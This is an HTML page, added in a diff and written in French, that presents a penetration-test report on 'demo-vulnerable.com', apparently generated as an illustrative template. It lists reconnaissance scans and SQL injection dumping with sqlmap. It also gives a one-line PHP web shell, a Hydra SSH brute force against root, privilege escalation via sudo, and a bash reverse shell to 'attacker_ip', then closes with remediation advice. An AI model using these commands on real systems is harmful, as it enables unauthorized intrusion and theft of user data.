@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Rapport de Pentest - demo-vulnerable.com</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-gray-100 text-gray-800">
+    <div class="max-w-4xl mx-auto p-6">
+      <header class="mb-8">
+        <h1 class="text-3xl font-bold text-blue-600">Rapport de Test d'Intrusion</h1>
+        <p class="text-gray-600">Cible : demo-vulnerable.com</p>
+        <p class="text-sm text-gray-500">Mode : Black Box | Durée : 3 jours</p>
+      </header>
+
+      <!-- 1. Préparation -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">1. Préparation</h2>
+        <ul class="list-disc list-inside">
+          <li><strong>Objectif</strong> : Identifier les failles exploitables sur l'application web principale</li>
+          <li><strong>Portée</strong> : Domaine principal uniquement (pas de sous-domaines ni d'infra interne)</li>
+          <li><strong>Type de test</strong> : Black Box</li>
+          <li><strong>Outils autorisés</strong> : Nmap, Gobuster, Burp Suite, SQLmap, Nikto, Hydra, Metasploit</li>
+        </ul>
+      </section>
+
+      <!-- 2. Reconnaissance Passive -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">2. Reconnaissance Passive</h2>
+        <p>Les informations recueillies de manière passive :</p>
+        <ul class="list-disc list-inside">
+          <li><strong>Recherche WHOIS</strong> pour obtenir des informations sur le domaine et l'hébergeur.</li>
+          <pre class="bg-gray-200 p-3 rounded">
+whois demo-vulnerable.com
+          </pre>
+          <li><strong>theHarvester</strong> pour collecter des emails et des sous-domaines.</li>
+          <pre class="bg-gray-200 p-3 rounded">
+theHarvester -d demo-vulnerable.com -b google -l 100
+          </pre>
+          <li><strong>Google Dorking</strong> pour rechercher des pages sensibles sur le site.</li>
+          <pre class="bg-gray-200 p-3 rounded">
+inurl:admin site:demo-vulnerable.com
+          </pre>
+        </ul>
+      </section>
+
+      <!-- 3. Reconnaissance Active -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">3. Reconnaissance Active</h2>
+        <p>Les informations collectées de manière active :</p>
+        <ul class="list-disc list-inside">
+          <li><strong>Scan de Ports (Nmap)</strong> pour identifier les services ouverts :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+nmap -sS -sV -p 80,443 demo-vulnerable.com
+          </pre>
+          <li><strong>Scan de Répertoires (Gobuster)</strong> pour découvrir des répertoires et fichiers cachés :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+gobuster dir -u http://demo-vulnerable.com -w /path/to/wordlist.txt
+          </pre>
+          <li><strong>Scan de Vulnérabilités Web (Nikto)</strong> pour détecter les vulnérabilités courantes :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+nikto -h http://demo-vulnerable.com
+          </pre>
+          <li><strong>Scan DNS (Subdomain Enumeration avec Sublist3r)</strong> pour détecter les sous-domaines :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+sublist3r -d demo-vulnerable.com
+          </pre>
+        </ul>
+      </section>
+
+      <!-- 4. Analyse des Vulnérabilités -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">4. Analyse des Vulnérabilités</h2>
+        <p>Les vulnérabilités découvertes :</p>
+        <ul class="list-disc list-inside">
+          <li><strong>Fichier Sensible (backup.zip)</strong> téléchargé contenant des informations sensibles comme le code source de l'application :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+wget http://demo-vulnerable.com/backup.zip
+unzip backup.zip
+          </pre>
+          <li><strong>Injection SQL</strong> détectée via le formulaire de connexion (mot de passe stocké en clair dans config.php) :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+sqlmap -u "http://demo-vulnerable.com/login.php?user=admin&pass=test" --dbs
+          </pre>
+        </ul>
+      </section>
+
+      <!-- 5. Exploitation -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">5. Exploitation</h2>
+        <p>Exploitation des vulnérabilités découvertes :</p>
+        <ul class="list-disc list-inside">
+          <li><strong>Injection SQL</strong> exploitée pour accéder à la base de données :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+sqlmap -u "http://demo-vulnerable.com/login.php?user=admin&pass=test" --dump
+          </pre>
+          <li><strong>Accès via Web Shell</strong> grâce à un upload de fichier PHP dans le répertoire `/uploads/` :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+<?php system($_GET['cmd']); ?>
+          </pre>
+          <li><strong>Brute Force avec Hydra</strong> sur SSH :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+hydra -l root -P /path/to/wordlist.txt ssh://demo-vulnerable.com
+          </pre>
+        </ul>
+      </section>
+
+      <!-- 6. Post-Exploitation -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">6. Post-Exploitation</h2>
+        <p>Actions post-exploitation :</p>
+        <ul class="list-disc list-inside">
+          <li><strong>Accès à la base de données</strong> et extraction des informations sensibles (comptes utilisateurs) :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+SELECT * FROM users;
+          </pre>
+          <li><strong>Escalade de privilèges</strong> en utilisant sudo avec l'utilisateur web :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+sudo -l
+sudo su
+          </pre>
+          <li><strong>Création d'un reverse shell</strong> pour maintenir un accès persistant :</li>
+          <pre class="bg-gray-200 p-3 rounded">
+nc -lvnp 4444
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+          </pre>
+        </ul>
+      </section>
+
+      <!-- 7. Recommandations -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">7. Recommandations</h2>
+        <ul class="list-disc list-inside">
+          <li><strong>Utiliser des requêtes préparées</strong> pour éviter les injections SQL.</li>
+          <li><strong>Restreindre les types de fichiers uploadés</strong> uniquement aux extensions nécessaires (ex. : .jpg, .png).</li>
+          <li><strong>Supprimer les fichiers sensibles</strong> comme les backups du serveur.</li>
+          <li><strong>Restreindre les privilèges</strong> de l'utilisateur web pour éviter l'escalade vers des privilèges sudo.</li>
+        </ul>
+      </section>
+
+      <!-- 8. Revalidation -->
+      <section class="bg-white rounded-xl shadow p-6 mb-6">
+        <h2 class="text-2xl font-semibold mb-2">8. Revalidation</h2>
+        <p>Revalidation après la mise en place des corrections :</p>
+        <ul class="list-disc list-inside">
+          <li><strong>Les injections SQL</strong> ont été corrigées avec des requêtes préparées.</li>
+          <li><strong>L'upload de fichiers</strong> est désormais restreint aux extensions autorisées.</li>
+          <li><strong>Les fichiers sensibles</strong> ont été supprimés du serveur.</li>
+          <li><strong>Les privilèges sudo</strong> ont été correctement restreints.</li>
+        </ul>
+      </section>
+
+      <footer class="text-center text-sm text-gray-500 mt-8">
+        Rapport généré par PentestGPT · 2025
+      </footer>
+    </div>
+  </body>
+</html>
